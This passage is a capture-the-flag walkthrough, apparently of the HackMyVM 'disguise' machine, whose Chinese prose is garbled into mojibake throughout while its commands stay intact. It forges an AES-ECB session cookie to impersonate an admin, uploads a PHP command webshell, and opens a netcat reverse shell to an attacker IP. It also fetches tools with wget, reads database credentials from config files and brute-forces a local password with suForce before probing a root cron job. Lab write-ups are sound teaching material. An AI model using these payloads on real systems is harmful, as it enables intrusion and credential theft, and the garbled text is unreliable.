![image-20250516123651762](https://7r1umphk.github.io/image/20250516123652137.webp)
ÂÜçËøõË°åBase64Ëß£Á†Å„ÄÇ
![image-20250516123753831](https://7r1umphk.github.io/image/20250516123754183.webp)
ÂæóÂà∞‰∏Ä‰∏≤‰∫åËøõÂà∂‰π±Á†Å„ÄÇÈÄöËøáÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑È™åËØÅÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d
ÔøΩjÔøΩ|s.NÔøΩÔøΩ+dsÔøΩÔøΩ
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ echo '1mr9fHMuTh6J56IrZHP28w==' | base64 -d | xxd
00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..
```

Ëøô16Â≠óËäÇÁöÑ‰π±Á†ÅÂæàÂèØËÉΩÊòØÂä†ÂØÜÂêéÁöÑÁî®Êà∑‰ø°ÊÅØ„ÄÇ

### 5.3.1 ÂàÜÊûêÂä†ÂØÜÊ®°ÂºèÂíåÂùóÂ§ßÂ∞è

‰∏∫‰∫ÜÂàÜÊûêÂä†ÂØÜÁªÜËäÇÔºåÊ≥®ÂÜå‰∏çÂêåÈïøÂ∫¶ÁöÑÁî®Êà∑ÂêçÔºàÂØÜÁ†ÅÂõ∫ÂÆö‰∏∫`111111`ÔºâÔºåËßÇÂØü `dark_session` ÁöÑÂèòÂåñ„ÄÇ

*   Áî®Êà∑ `admin` (5Â≠óËäÇ): `dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D`
    *   Base64Ëß£Á†ÅÂêéxxd: `d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3` (16Â≠óËäÇ)
*   Áî®Êà∑ `adminadmin` (10Â≠óËäÇ): `dark_session=nkhz%2FGuSp8O6W0%2FNKRWDrg%3D%3D`
    *   Base64Ëß£Á†ÅÂêéxxd: `9e48 73fc 6b92 a7c3 ba5b 4fcd 2915 83ae` (16Â≠óËäÇ)
*   Áî®Êà∑ `adminadminadmin` (15Â≠óËäÇ): `dark_session=iVItH823tj24X11GL%2BrzqF15zKXhTZzq4geu6%2BoJYh0%3D`
    *   Base64Ëß£Á†ÅÂêéxxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 5d79 cca5 e14d 9cea e207 aeeb ea09 621d` (32Â≠óËäÇ)
*   Áî®Êà∑ `adminadminadminadmin` (20Â≠óËäÇ): `dark_session=iVItH823tj24X11GL%2BrzqHXcmFsh%2Be0Wk1hiTcLtOls%3D`
    *   Base64Ëß£Á†ÅÂêéxxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 75dc 985b 21f9 ed16 9358 624d c2ed 3a5b` (32Â≠óËäÇ)

ËßÇÂØü15Â≠óËäÇÂíå20Â≠óËäÇÁî®Êà∑ÂêçÁöÑÂØÜÊñáÔºåÂÆÉ‰ª¨ÁöÑÂâç16Â≠óËäÇÂÆåÂÖ®Áõ∏Âêå (`8952...f3a8`)„ÄÇËøôÂº∫ÁÉàÊöóÁ§∫‰∫ÜÂä†ÂØÜÊ®°Âºè‰∏∫ **ECB (Electronic Codebook)**Ôºå‰∏îÂùóÂ§ßÂ∞è‰∏∫ **16Â≠óËäÇ**„ÄÇ

### 5.3.2 Á°ÆËÆ§ÂØÜÁ†Å‰∏çÂèÇ‰∏éCookieÂä†ÂØÜ

Ê≥®ÂÜåÁî®Êà∑ `test2` (5Â≠óËäÇ)ÔºåÂØÜÁ†Å `1111111111` (‰∏é‰πãÂâçÁöÑ `111111` ‰∏çÂêå)„ÄÇ
`dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D`
Base64Ëß£Á†ÅÂêéxxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (‰ªç‰∏∫16Â≠óËäÇ)„ÄÇ
ÂØÜÊñáÈïøÂ∫¶ÂíåÁªìÊûÑÊú™Âõ†ÂØÜÁ†ÅÊîπÂèòËÄåÊîπÂèòÔºåÁ°ÆËÆ§ÂØÜÁ†Å‰∏çÁõ¥Êé•ÂèÇ‰∏é `dark_session` ÁöÑÂä†ÂØÜ„ÄÇ

### 5.3.3 Êé®Êñ≠SaltÂíåÂ°´ÂÖÖÊú∫Âà∂

Âä†ÂØÜÁöÑÊòéÊñáÁªìÊûÑÊé®Êµã‰∏∫ `Salt + Username`ÔºåÁÑ∂ÂêéËøõË°åPKCS#7Â°´ÂÖÖ„ÄÇ

*   `adminadmin` (10Â≠óËäÇ) + Salt -&gt; 16Â≠óËäÇÂØÜÊñá (1Âùó)
*   `adminadminadmin` (15Â≠óËäÇ) + Salt -&gt; 32Â≠óËäÇÂØÜÊñá (2Âùó)

ËøôË°®Êòé `(SaltÈïøÂ∫¶ + 10)` ÁªèËøáÂ°´ÂÖÖÂêé‰∏∫16Â≠óËäÇÔºåËÄå `(SaltÈïøÂ∫¶ + 15)` ÁªèËøáÂ°´ÂÖÖÂêé‰∏∫32Â≠óËäÇ„ÄÇ
ËÆæSaltÈïøÂ∫¶‰∏∫ `S`„ÄÇ

*   `S + 10 &lt;= 16`
*   `S + 15 &gt; 16` (Âõ†‰∏∫‰∫ßÁîü‰∫ÜÁ¨¨‰∫åÂùóÂØÜÊñá)

Â¶ÇÊûú `S = 4`Ôºö

*   `4 + 10 = 14`Â≠óËäÇ„ÄÇPKCS#7Â°´ÂÖÖ2Â≠óËäÇ (ÊØè‰∏™Â≠óËäÇ‰∏∫`\x02`)ÔºåÊÄªÂÖ±16Â≠óËäÇ„ÄÇ
*   `4 + 15 = 19`Â≠óËäÇ„ÄÇPKCS#7Â°´ÂÖÖ13Â≠óËäÇ (ÊØè‰∏™Â≠óËäÇ‰∏∫`\x0d`)ÔºåÊÄªÂÖ±32Â≠óËäÇ„ÄÇ
    Ëøô‰∏™Êé®Êñ≠‰∏éÁ¨¨‰∏Ä‰∏™ÂØÜÊñáÂùóÂèØËÉΩÁõ∏ÂêåÁöÑECBÁâπÊÄßÂêªÂêà„ÄÇ

Ëøõ‰∏ÄÊ≠•È™åËØÅSaltÈïøÂ∫¶ÂíåPKCS#7Â°´ÂÖÖËßÑÂàôÔºàÁâπÂà´ÊòØÂΩìÊï∞ÊçÆÈïøÂ∫¶Ê≠£Â•ΩÊòØÂùóÂ§ßÂ∞èÊó∂ÔºâÔºö
Ê≥®ÂÜåÁî®Êà∑ `adminadminad` (12Â≠óËäÇ)ÔºåÂØÜÁ†Å `111111`„ÄÇ
`dark_session=iVItH823tj24X11GL%2BrzqMJwkfrsOdSxW16pbszGJLY%3D`
Base64Ëß£Á†ÅÂêéxxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6` (32Â≠óËäÇ)„ÄÇ
Â¶ÇÊûúSalt‰∏∫4Â≠óËäÇÔºåÂàô `Salt(4) + adminadminad(12) = 16`Â≠óËäÇ„ÄÇÊ†πÊçÆPKCS#7Â°´ÂÖÖËßÑÂàôÔºåÂΩìÊï∞ÊçÆÈïøÂ∫¶Á≠â‰∫éÂùóÂ§ßÂ∞èÊó∂Ôºå‰ªçÈúÄÂ°´ÂÖÖ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑ16Â≠óËäÇÂùó (16‰∏™`\x10`)„ÄÇÂõ†Ê≠§ÊÄªÊòéÊñáÈïøÂ∫¶‰∏∫32Â≠óËäÇÔºå‰∫ßÁîü32Â≠óËäÇÂØÜÊñá„ÄÇËøô‰∏éËßÇÂØü‰∏ÄËá¥ÔºåÁ°ÆËÆ§ **SaltÈïøÂ∫¶‰∏∫4Â≠óËäÇ**„ÄÇ

### 5.3.4 ‰º™ÈÄ†simpleAdminÁöÑCookie

ÁõÆÊ†áÁî®Êà∑ `simpleAdmin` (11Â≠óËäÇ)„ÄÇ
ÊúçÂä°Âô®ÂÆûÈôÖÂä†ÂØÜÁöÑÊòéÊñá‰∏∫ `Salt(4) + 'simpleAdmin'(11) = 15`Â≠óËäÇ„ÄÇ
PKCS#7Â°´ÂÖÖÂêé‰∏∫ `Salt(4) + 'simpleAdmin'(11) + '\x01'(padding)`ÔºåÂÖ±16Â≠óËäÇ„ÄÇ

‰∏∫‰∫ÜËé∑ÂèñÂØÜÊñáÔºåÊàë‰ª¨ÂèØ‰ª•Ê≥®ÂÜå‰∏Ä‰∏™Áî®Êà∑Âêç‰∏∫ `simpleAdmin\x01` (ËøôÈáå `\x01` ÊòØÁî®Êà∑ÂêçÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÊÄªÈïø12Â≠óËäÇ)„ÄÇ
ÊúçÂä°Âô®Âä†ÂØÜÁöÑÊòéÊñáÂùó1Â∞ÜÊòØ `Salt(4) + 'simpleAdmin\x01'(username_part, 12) = 16`Â≠óËäÇ„ÄÇ
Áî±‰∫éÊ≠£Â•Ω16Â≠óËäÇÔºå‰ºöÂÜçÂ°´ÂÖÖ‰∏Ä‰∏™16Â≠óËäÇÁöÑ `\x10` Âùó„ÄÇ
‰ΩÜÈáçË¶ÅÁöÑÊòØÔºåÁ¨¨‰∏Ä‰∏™16Â≠óËäÇÊòéÊñáÂùóÁöÑÊï∞ÊçÆ‰∏éÊàë‰ª¨ÁõÆÊ†áÁî®Êà∑ `simpleAdmin` ÁªèËøáÂ°´ÂÖÖÂêéÁöÑÊòéÊñáÂùóÊï∞ÊçÆÊòØÁõ∏ÂêåÁöÑÔºÅ

Êìç‰ΩúÊ≠•È™§Ôºö

1. Âú®Ê≥®ÂÜåÈ°µÈù¢ËæìÂÖ•Áî®Êà∑Âêç `simpleAdmin`„ÄÇ

2. ‰ΩøÁî®BurpSuiteÊã¶Êà™Ê≥®ÂÜåËØ∑Ê±ÇÔºåÂ∞Ü`username`ÂèÇÊï∞ÂÄº‰øÆÊîπ‰∏∫ `simpleAdmin%01` (URLÁºñÁ†ÅÁöÑ`\x01`)ÔºåÂØÜÁ†Å `111111`„ÄÇ

   *Ê≥®ÊÑèÔºöÁôªÂΩïÁöÑÊó∂ÂÄô‰πüË¶ÅËøõË°åÂíå2‰∏ÄÊ†∑ÁöÑÊìç‰Ωú*

3. Ê≥®ÂÜåÊàêÂäüÂêéÔºåÊµèËßàÂô®Cookie‰∏≠ÁöÑ `dark_session` ÂÄº‰∏∫ `%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`„ÄÇ

4. URLËß£Á†ÅÔºö`+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=`

5. Base64Ëß£Á†ÅÂêéËøõË°åxxdÊü•ÁúãÔºö

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
   ‚îî‚îÄ$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | xxd
   00000000: fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17  ._...B-......;..
   00000010: c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6  .p...9..[^.n..$.
   ```

6. ÂèñÁ¨¨‰∏Ä‰∏™16Â≠óËäÇÁöÑÂØÜÊñá `fb5f b7fc dc42 2dc2 11d0 9abd a83b 9d17`„ÄÇ

7. Â∞ÜÊ≠§16Â≠óËäÇÂØÜÊñáËøõË°åBase64ÁºñÁ†ÅÔºö

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
   ‚îî‚îÄ$ echo '+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=' | base64 -d | head -c 16 | base64
   +1+3/NxCLcIR0Jq9qDudFw==
   ```

8. Â∞ÜÂæóÂà∞ÁöÑBase64ÁºñÁ†ÅÂêéÁöÑÂ≠óÁ¨¶‰∏≤ `%2B1%2B3%2FNxCLcIR0Jq9qDudFw%3D%3D` (Ê≥®ÊÑèURLÁºñÁ†Å) ËÆæÁΩÆ‰∏∫ `dark_session` CookieÁöÑÂÄº„ÄÇ

9. ËÆøÈóÆ `http://dark.disguise.hmv/profile.php`ÔºåÊàêÂäü‰ª• `simpleAdmin` Áî®Êà∑Ë∫´‰ªΩÁôªÂΩï„ÄÇ
   ![image-20250516163748655](https://7r1umphk.github.io/image/20250516163749012.webp)
   ËøôÊ≥¢Êìç‰ΩúÔºåÊù•‰πã‰∏çÊòìÂïäÔºÅ

# ÂÖ≠„ÄÅËé∑ÂèñWebShell

‰ª•`simpleAdmin`Ë∫´‰ªΩÁôªÂΩïÂêéÔºåËøõÂÖ•ÂêéÂè∞ÁÆ°ÁêÜÈ°µÈù¢ (`/manager/index.php`)ÔºåÂèëÁé∞ÊúâÊ∑ªÂä†ÂïÜÂìÅÁöÑÂäüËÉΩÔºåÂπ∂‰∏îÂèØ‰ª•‰∏ä‰º†ÂïÜÂìÅÂõæÁâá„ÄÇÂÖà‰∏ä‰º†‰∫Ü‰∏Ä‰∏™`reverse.php`
![image-20250516164155309](https://7r1umphk.github.io/image/20250516164155596.webp)

Âà∞È¶ñÈ°µÊü•ÁúãÊ∫êÁ†ÅÔºåËøõÂÖ•ÂõæÁâáÁΩëÂùÄÂèëÁé∞Ëøô‰∏™ÊñπÂºèËøõÂÖ•ÁöÑ‰∏çËß£Êûêphp

‰ΩøÁî®`gobuster`ÂØπ `dark.disguise.hmv` Á´ôÁÇπËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÁ°ÆËÆ§ÂõæÁâá‰∏ä‰º†Ë∑ØÂæÑ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ gobuster dir -u http://dark.disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 282]
/.php                 (Status: 403) [Size: 282]
/images               (Status: 301) [Size: 323] [--&gt; http://dark.disguise.hmv/images/]
/index.php            (Status: 200) [Size: 1020]
/login.php            (Status: 200) [Size: 1134]
# ... (ÈÉ®ÂàÜËæìÂá∫) ...
/captcha.php          (Status: 200) [Size: 370]
^C
[!] Keyboard interrupt detected, terminating.
Progress: 20066 / 1323360 (1.52%)
===============================================================
Finished
===============================================================
```

ÂèëÁé∞ `/images/` ÁõÆÂΩï„ÄÇ‰ΩÜÊòØÊòØ301Áä∂ÊÄÅÔºåÂ∞ùËØïÂú®`/images/`ËÆøÈóÆ`reverse.php`ÊòæÁ§∫404,ÊúçÂä°Âô®ÂØπÊñá‰ª∂ÂêçÂÅö‰∫ÜÂ§ÑÁêÜÔºàMD5ÊàñËÄÖÂÖ∂‰ªñÂìàÂ∏åÔºâ
ÈáçÊñ∞‰∏ä‰º†‰∏Ä‰∏™ÁÆÄÂçïÁöÑPHP‰∏ÄÂè•ËØùÊú®È©¨ÔºåÂÜÖÂÆπ‰∏∫Ôºö

```php
&lt;?php
if (isset($_REQUEST['cmd'])) {
    $command = $_REQUEST['cmd'];
    echo '&lt;pre&gt;'; // For better formatting of command output

    // Execute the command
    // Using passthru for direct output, or system/exec if preferred
    passthru($command, $return_var);
    // Alternatively:
    // $output = shell_exec($command);
    // echo htmlentities($output);

    echo '&lt;/pre&gt;';
} else {
    echo '&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP CMD Exec&lt;/title&gt;&lt;/head&gt;&lt;body&gt;';
    echo '&lt;form method='GET'&gt;';
    echo 'Enter command: &lt;input type='text' name='cmd' autofocus&gt;';
    echo '&lt;input type='submit' value='Execute'&gt;';
    echo '&lt;/form&gt;';
    echo '&lt;p&gt;Example: ?cmd=ls -la OR ?cmd=whoami&lt;/p&gt;';
    echo '&lt;/body&gt;&lt;/html&gt;';
}
?&gt;
```

‰∏ä‰º†Êó∂ÔºåÁªôÊñá‰ª∂ÂêçÂä†‰∫Ü‰∏Ä‰∏™`'`ÊàêÂäüÊä•ÈîôÊãøÂà∞‰∫ÜÁúüÂÆûÊñá‰ª∂Âêç„ÄÇ
![image-20250516165009887](https://7r1umphk.github.io/image/20250516165010255.webp)
ËÆøÈóÆ `http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=id
&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;
```

ÂëΩ‰ª§ÊàêÂäüÊâßË°åÔºåÂΩìÂâçÁî®Êà∑‰∏∫ `www-data`„ÄÇ

# ‰∏É„ÄÅÊùÉÈôêÊèêÂçá

## 7.1 Ëé∑ÂèñÂèçÂºπShell

Âà©Áî®Â∑≤‰∏ä‰º†ÁöÑWebshellËé∑Âèñ‰∏Ä‰∏™ÂèçÂºπShellÔºå‰ª•‰æøËøõË°åÊõ¥Êñπ‰æøÁöÑÊìç‰Ωú„ÄÇ
Âú®Kali‰∏äËÆæÁΩÆÁõëÂê¨Ôºö

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/shell]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
```

ÈÄöËøáWebshellÊâßË°åÂèçÂºπÂëΩ‰ª§Ôºö
`http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash`

![image-20250516165136706](https://7r1umphk.github.io/image/20250516165136907.webp)

ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/shell]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.206] from (UNKNOWN) [192.168.205.211] 51496
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÂØπShellËøõË°åTTY‰ºòÂåñÔºö

```bash
script /dev/null -c bash
# Êåâ Ctrl+Z Â∞ÜÂÖ∂ÁΩÆ‰∫éÂêéÂè∞
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## 7.2 ‰ø°ÊÅØÊî∂ÈõÜ (www-data Áî®Êà∑)

Âú® `/var/www/dark/` ÁõÆÂΩï‰∏ãÊâæÂà∞ `config.php`„ÄÇ

```bash
www-data@disguise:/var/www/dark$ cat config.php
&lt;?php

$DB_USER = 'dark_db_admin';
$DB_PASS = 'Str0ngPassw0d1***';
$DB_NAME = 'dark_shop';

?&gt;
```

ÊãøÂà∞Êï∞ÊçÆÂ∫ìÁî®Êà∑Âêç `dark_db_admin` ÂíåÂØÜÁ†Å `Str0ngPassw0d1***`„ÄÇ
ÁôªÂΩïÊï∞ÊçÆÂ∫ìÊü•ÁúãÁî®Êà∑‰ø°ÊÅØ„ÄÇ

```bash
www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78045
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| dark_shop          |
| information_schema |
+--------------------+
2 rows in set (0.014 sec)

MariaDB [(none)]&gt; use dark_shop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [dark_shop]&gt; show tables;
+---------------------+
| Tables_in_dark_shop |
+---------------------+
| products            |
| users               |
+---------------------+
2 rows in set (0.000 sec)

MariaDB [dark_shop]&gt; select * from users;
+----+------------------------------------------+--------------------------+---------+---------------------+
| id | username                                 | password                 | isAdmin | created_at          |
+----+------------------------------------------+--------------------------+---------+---------------------+
|  1 | simpleAdmin                              | U3RyMG5nUGFzc3cwZDFAQEA= |       1 | 2025-04-01 04:33:22 |
# ... ÂÖ∂‰ªñÁî®Êà∑ ...
+----+------------------------------------------+--------------------------+---------+---------------------+
13 rows in set (0.001 sec)
```

`simpleAdmin` ÁöÑÂØÜÁ†ÅÂìàÂ∏åÊòØ `U3RyMG5nUGFzc3cwZDFAQEA=`ÔºåBase64Ëß£Á†ÅÂêéÊòØ `Str0ngPassw0d1***`„ÄÇ

Êü•Áúã `/home/` ÁõÆÂΩïÔºåÂèëÁé∞Áî®Êà∑ `darksoul`„ÄÇ

```bash
www-data@disguise:/var/www/dark$ ls -la /home/
total 12
drwxr-xr-x  3 root     root     4096 Mar 31 11:19 .
drwxr-xr-x 18 root     root     4096 Mar 31 11:13 ..
drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
```

Â∞ùËØïÁî® `Str0ngPassw0d1***` ÂàáÊç¢Âà∞ `darksoul`ÔºåÂ§±Ë¥•„ÄÇ
Âú® `/home/darksoul/` ÁõÆÂΩï‰∏ãÂèëÁé∞ `config.ini`ÔºåÂÜÖÂÆπÂíå `/var/www/dark/config.php` ‰∏≠ÁöÑÊï∞ÊçÆÂ∫ìÂØÜÁ†Å‰∏ÄËá¥„ÄÇ

```bash
www-data@disguise:/home/darksoul$ cat config.ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
```

ÁúãÊù• `darksoul` ÁöÑÂØÜÁ†ÅÈúÄË¶ÅÁàÜÁ†¥„ÄÇÂØÜÁ†ÅÊ†ºÂºèÂèØËÉΩÊòØ `Str0ngPassw0d1` + ‰∏â‰∏™ÁâπÊÆäÂ≠óÁ¨¶„ÄÇ
‰∏ä‰º†‰∏Ä‰∏™suÁàÜÁ†¥ËÑöÊú¨ `suForce` ÂíåÂØÜÁ†ÅÂ≠óÂÖ∏ `pass` Âà∞ `/tmp/`„ÄÇ
Â≠óÂÖ∏ `pass` ÁîüÊàêÊñπÊ≥ï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ crunch 3 3 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?!@#$%^&amp;*()' \ | sed 's/^/Str0ngPassw0d1/' &gt; pass
Crunch will now generate the following amount of data: 1556068 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 389017
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat pass | wc -l                                                               389017
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ tac pass | sponge pass
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat pass | wc -l
389017
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ head -n 10 pass
Str0ngPassw0d1)))
Str0ngPassw0d1))(
Str0ngPassw0d1))*
Str0ngPassw0d1))&amp;
Str0ngPassw0d1))^
Str0ngPassw0d1))%
Str0ngPassw0d1))$
Str0ngPassw0d1))#
Str0ngPassw0d1))@
Str0ngPassw0d1))!
```

```bash
www-data@disguise:/tmp$ wget 192.168.205.206/suForce
www-data@disguise:/tmp$ wget 192.168.205.206/pass
www-data@disguise:/tmp$ chmod +x suForce
www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
            _____
 ___ _   _ |  ___|__  _ __ ___ ___
/ __| | | || |_ / _ \| '__/ __/ _ \
\__ \ |_| ||  _| (_) | | | (_|  __/
|___/\__,_||_|  \___/|_|  \___\___|
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ Username | darksoul
üìñ Wordlist | pass
üîé Status   | 54031/389017/13%/Str0ngPassw0d1??? 
üí• Password | Str0ngPassw0d1???                
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
```

ÁàÜÁ†¥ÊàêÂäüÔºå`darksoul` ÁöÑÂØÜÁ†ÅÊòØ `Str0ngPassw0d1???`
ÂàáÊç¢Áî®Êà∑„ÄÇ

```bash
www-data@disguise:/tmp$ su darksoul
Password:
darksoul@disguise:/tmp$ id
uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
```

ÊàêÂäüÂàáÊç¢Âà∞ `darksoul`„ÄÇÊü•Áúã `user.txt`„ÄÇ

```bash
darksoul@disguise:~$ ls -la
total 40
drwxr-xr-x 4 darksoul darksoul 4096 Apr  2 04:19 .
drwxr-xr-x 3 root     root     4096 Mar 31 11:19 ..
lrwxrwxrwx 1 root     root        9 Apr  2 00:16 .bash_history -&gt; /dev/null
-rw-r--r-- 1 darksoul darksoul  220 Mar 31 11:19 .bash_logout
-rw-r--r-- 1 darksoul darksoul 3526 Mar 31 11:19 .bashrc
-rw-r--r-- 1 root     root      114 Apr  2 04:03 config.ini
-rw-r--r-- 1 root     root       32 May 16 06:44 darkshopcount
drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
-rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
-rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
darksoul@disguise:~$ cat user.txt
Good good study &amp; Day day up,but where is the flag?
darksoul@disguise:~$ grep -r -i 'HMV{' / 2&gt;/dev/null
/home/darksoul/user.txt:hmv{hiddenflag}
^C
```

ËøôÈáåÊúâ‰∏™flag `hmv{hiddenflag}`„ÄÇ
Áî®`xxd`‰πüËÉΩÁúãÂà∞„ÄÇ

```bash
darksoul@disguise:~$ xxd user.txt
00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study
00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  &amp; Day day up,but
00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
00000040: 6167 7d0d                                ag}.
```

Ëé∑ÂèñÁ¨¨‰∏Ä‰∏™flag: `hmv{hiddenflag}`„ÄÇ

## 7.3 darksoul -&gt; root ÊèêÊùÉ

‰ΩøÁî®`pspy64`ÁõëÊéßËøõÁ®ã„ÄÇ

```bash
darksoul@disguise:/tmp$ wget 192.168.205.206/pspy64
darksoul@disguise:/tmp$ chmod +x pspy64
darksoul@disguise:/tmp$ ./pspy64
# ... (pspy64 ËæìÂá∫) ...
2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini &gt; /home/darksoul/darkshopcount
2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini
# ... (pspy64 ËæìÂá∫) ...
```

ÂèëÁé∞‰∏Ä‰∏™rootÊùÉÈôêÁöÑcronÂÆöÊó∂‰ªªÂä°ÔºåÊØè‰∏ÄÂàÜÈíüÊâßË°å `/usr/bin/python3 /opt/query.py /home/darksoul/config.ini`„ÄÇ
Êü•Áúã `/opt/query.py` Ê∫êÁ†ÅÔºö

```python
import mysql.connector
import sys

def main():
    if len(sys.argv) != 2:
        print('Usage: python query.py &lt;configfile&gt;')
        sys.exit(1)

    cnf = sys.argv[1]

    try:
        conn = mysql.connector.connect(read_default_file=cnf) # ÂÖ≥ÈîÆÁÇπ
        cursor = conn.cursor()

        query = 'SELECT COUNT(*) FROM users'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f'users count:{results[0][0]}')

        query = 'SELECT COUNT(*) FROM products'
        cursor.execute(query)
        results = cursor.fetchall()
        print(f'products count:{results[0][0]}')
    except mysql.connector.Error as err:
        print(f'db connect error: {err}')
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals() and conn.is_connected():
            conn.close()

if __name__ == '__main__':
    main()
```

